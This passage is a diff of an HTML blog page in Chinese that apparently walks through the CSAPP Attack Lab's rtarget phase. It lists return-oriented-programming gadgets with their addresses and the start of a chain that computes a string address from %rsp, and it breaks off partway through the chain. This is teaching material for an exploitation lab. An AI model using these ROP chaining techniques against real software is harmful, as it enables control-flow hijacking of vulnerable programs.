 <pre><div class="head"><div class="language">Unknown</div><div class="copy" data="cG9wcSUyMCUyNXJheCUzQSUyMDB4NDAxOWNjJTBBMDAwMDAwMDAwMDQwMTljYSUyMCUzQ2dldHZhbF8yODAlM0UlM0ElMEElMjAlMjA0MDE5Y2ElM0ElMDliOCUyMDI5JTIwNTglMjA5MCUyMGMzJTIwJTIwJTIwJTIwJTIwJTIwJTIwJTA5bW92JTIwJTIwJTIwJTIwJTI0MHhjMzkwNTgyOSUyQyUyNWVheCUwQSUyMCUyMDQwMTljZiUzQSUwOWMzJTIwJTIwJTIwJTIwJTIwJTIwJTIwJTIwJTIwJTIwJTIwJTIwJTIwJTIwJTIwJTIwJTIwJTIwJTIwJTA5cmV0JTBBbW92cSUyMCUyNXJzcCUyQyUyNXJheCUzQSUyMDB4NDAxYTA2JTBBMDAwMDAwMDAwMDQwMWEwMyUyMCUzQ2FkZHZhbF8xOTAlM0UlM0ElMEElMjAlMjA0MDFhMDMlM0ElMDk4ZCUyMDg3JTIwNDElMjA0OCUyMDg5JTIwZTAlMjAlMjAlMjAlMjAlMDlsZWElMjAlMjAlMjAlMjAtMHgxZjc2YjdiZiglMjVyZGkpJTJDJTI1ZWF4JTBBJTIwJTIwNDAxYTA5JTNBJTA5YzMlMjAlMjAlMjAlMjAlMjAlMjAlMjAlMjAlMjAlMjAlMjAlMjAlMjAlMjAlMjAlMjAlMjAlMjAlMjAlMDlyZXQlMEFtb3ZxJTIwJTI1cmF4JTJDJTI1cmRpJTNBJTIwMHg0MDE5YTIlMEEwMDAwMDAwMDAwNDAxOWEwJTIwJTNDYWRkdmFsXzI3MyUzRSUzQSUwQSUyMCUyMDQwMTlhMCUzQSUwOThkJTIwODclMjA0OCUyMDg5JTIwYzclMjBjMyUyMCUyMCUyMCUyMCUwOWxlYSUyMCUyMCUyMCUyMC0weDNjMzg3NmI4KCUyNXJkaSklMkMlMjVlYXglMEElMjAlMjA0MDE5YTYlM0ElMDljMyUyMCUyMCUyMCUyMCUyMCUyMCUyMCUyMCUyMCUyMCUyMCUyMCUyMCUyMCUyMCUyMCUyMCUyMCUyMCUwOXJldCUwQW1vdmwlMjAlMjVlYXglMkMlMjVlZHglM0ElMjAweDQwMTlkZCUwQTAwMDAwMDAwMDA0MDE5ZGIlMjAlM0NnZXR2YWxfNDgxJTNFJTNBJTBBJTIwJTIwNDAxOWRiJTNBJTA5YjglMjA1YyUyMDg5JTIwYzIlMjA5MCUyMCUyMCUyMCUyMCUyMCUyMCUyMCUwOW1vdiUyMCUyMCUyMCUyMCUyNDB4OTBjMjg5NWMlMkMlMjVlYXglMEElMjAlMjA0MDE5ZTAlM0ElMDljMyUyMCUyMCUyMCUyMCUyMCUyMCUyMCUyMCUyMCUyMCUyMCUyMCUyMCUyMCUyMCUyMCUyMCUyMCUyMCUwOXJldCUwQW1vdmwlMjAlMjVlZHglMkMlMjVlY3glM0ElMjAweDQwMWEzNCUwQTAwMDAwMDAwMDA0MDFhMzMlMjAlM0NnZXR2YWxfMTU5JTNFJTNBJTBBJTIwJTIwNDAxYTMzJTNBJTA5YjglMjA4OSUyMGQxJTIwMzglMjBjOSUyMCUyMCUyMCUyMCUyMCUyMCUyMCUwOW1vdiUyMCUyMCUyMCUyMCUyNDB4YzkzOGQxODklMkMlMjVlYXglMEElMjAlMjA0MDFhMzglM0ElMDljMyUyMCUyMCUyMCUyMCUyMCUyMCUyMCUyMCUyMCUyMCUyMCUyMCUyMCUyMCUyMCUyMCUyMCUyMCUyMCUwOXJldCUwQW1vdmwlMjAlMjVlY3glMkMlMjVlc2klM0ElMjAweDQwMWEyNyUwQTAwMDAwMDAwMDA0MDFhMjUlMjAlM0NhZGR2YWxfMTg3JTNFJTNBJTBBJTIwJTIwNDAxYTI1JTNBJTA5OGQlMjA4NyUyMDg5JTIwY2UlMjAzOCUyMGMwJTIwJTIwJTIwJTIwJTA5bGVhJTIwJTIwJTIwJTIwLTB4M2ZjNzMxNzcoJTI1cmRpKSUyQyUyNWVheCUwQSUyMCUyMDQwMWEyYiUzQSUwOWMzJTIwJTIwJTIwJTIwJTIwJTIwJTIwJTIwJTIwJTIwJTIwJTIwJTIwJTIwJTIwJTIwJTIwJTIwJTIwJTA5cmV0JTBBbGVhJTIwKCUyNXJkaSUyQyUyNXJzaSUyQzEpJTJDJTI1cmF4JTNBJTIwMHg0MDE5ZDYlMEEwMDAwMDAwMDAwNDAxOWQ2JTIwJTNDYWRkX3h5JTNFJTNBJTBBJTIwJTIwNDAxOWQ2JTNBJTA5NDglMjA4ZCUyMDA0JTIwMzclMjAlMjAlMjAlMjAlMjAlMjAlMjAlMjAlMjAlMjAlMDlsZWElMjAlMjAlMjAlMjAoJTI1cmRpJTJDJTI1cnNpJTJDMSklMkMlMjVyYXglMEElMjAlMjA0MDE5ZGElM0ElMDljMyUyMCUyMCUyMCUyMCUyMCUyMCUyMCUyMCUyMCUyMCUyMCUyMCUyMCUyMCUyMCUyMCUyMCUyMCUyMCUwOXJldCUwQQ=="><svg focusable="false" viewBox="0 0 24 24"><path d="M16 1H4c-1.1 0-2 .9-2 2v14h2V3h12zm3 4H8c-1.1 0-2 .9-2 2v14c0 1.1.9 2 2 2h11c1.1 0 2-.9 2-2V7c0-1.1-.9-2-2-2m0 16H8V7h11z"></path></svg></div></div><code class="hljs"><div class="lines"><div>1</div><div>2</div><div>3</div><div>4</div><div>5</div><div>6</div><div>7</div><div>8</div><div>9</div><div>10</div><div>11</div><div>12</div><div>13</div><div>14</div><div>15</div><div>16</div><div>17</div><div>18</div><div>19</div><div>20</div><div>21</div><div>22</div><div>23</div><div>24</div><div>25</div><div>26</div><div>27</div><div>28</div></div><div class="code">popq %rax: 0x4019cc
 00000000004019ca &lt;getval_280&gt;:
   4019ca:	b8 29 58 90 c3       	mov    $0xc3905829,%eax
@@ -486,9 +622,9 @@ lea (%rdi,%rsi,1),%rax: 0x4019d6
   4019d6:	48 8d 04 37          	lea    (%rdi,%rsi,1),%rax
   4019da:	c3                   	ret
 </div></code></pre>
-<p>于是大概的思路就是，我们先把 <code>%rsp</code> 移动到 <code>%rdi</code> 中，然后通过 <code>pop</code> 将一个地址偏移量的数据从栈中传到 <code>%rax</code>，然后到 <code>%esi</code>，然后使用 <code>lea</code> 计算出字符串的地址，再传到 <code>%rdi</code> 中。字符串数据应该放在所有跳转地址的最后面
-一开始我是把 <code>%rsp</code> 放到 <code>%esi</code> 中的，后来在 gdb 中调试发现 rtarget 的栈位于整个虚拟内存空间比较高的一部分，这意味着栈地址的高 32 位是有数据的。而上面的指令中只有 <code>%eax</code> 到 <code>%edx</code>，不能传 64 位的栈地址
-然后大概是</p>
+<p>于是大概的思路就是，我们先把 <code>%rsp</code> 移动到 <code>%rdi</code> 中，然后通过 <code>pop</code> 将一个地址偏移量的数据从栈中传到 <code>%rax</code>，然后到 <code>%esi</code>，然后使用 <code>lea</code> 计算出字符串的地址，再传到 <code>%rdi</code> 中。字符串数据应该放在所有跳转地址的最后面</p>
+<p>一开始我是把 <code>%rsp</code> 放到 <code>%esi</code> 中的，后来在 gdb 中调试发现 rtarget 的栈位于整个虚拟内存空间比较高的一部分，这意味着栈地址的高 32 位是有数据的。而上面的指令中只有 <code>%eax</code> 到 <code>%edx</code>，不能传 64 位的栈地址</p>
+<p>然后大概是</p>
 <pre><div class="head"><div class="language">Unknown</div><div class="copy" data="cG9wcSUyMCUyNXJheCUwOSUwOSUwOSUwOTB4NDAxOWNhJTBBbW92bCUyMCUyNWVheCUyQyUyNWVkeCUwOSUwOSUwOTB4NDAxOWRkJTBBbW92bCUyMCUyNWVkeCUyQyUyNWVjeCUwOSUwOSUwOTB4NDAxYTM0JTBBbW92bCUyMCUyNWVjeCUyQyUyNWVzaSUwOSUwOSUwOTB4NDAxYTI3JTBBbW92cSUyMCUyNXJzcCUyQyUyNXJheCUwOSUwOSUwOTB4NDAxYTA2JTBBbW92cSUyMCUyNXJheCUyQyUyNXJkaSUwOSUwOSUwOTB4NDAxOWEyJTBBbGVhJTIwKCUyNXJkaSUyQyUyNXJzaSUyQzEpJTJDJTI1cmF4JTA5MHg0MDE5ZDYlMEFtb3ZxJTIwJTI1cmF4JTJDJTI1cmRpJTA5JTA5JTA5MHg0MDE5YTIlMEE="><svg focusable="false" viewBox="0 0 24 24"><path d="M16 1H4c-1.1 0-2 .9-2 2v14h2V3h12zm3 4H8c-1.1 0-2 .9-2 2v14c0 1.1.9 2 2 2h11c1.1 0 2-.9 2-2V7c0-1.1-.9-2-2-2m0 16H8V7h11z"></path></svg></div></div><code class="hljs"><div class="lines"><div>1</div><div>2</div><div>3</div><div>4</div><div>5</div><div>6</div><div>7</div><div>8</div></div><div class="code">popq %rax				0x4019ca
 movl %eax,%edx			0x4019dd
 movl %edx,%ecx			0x401a34
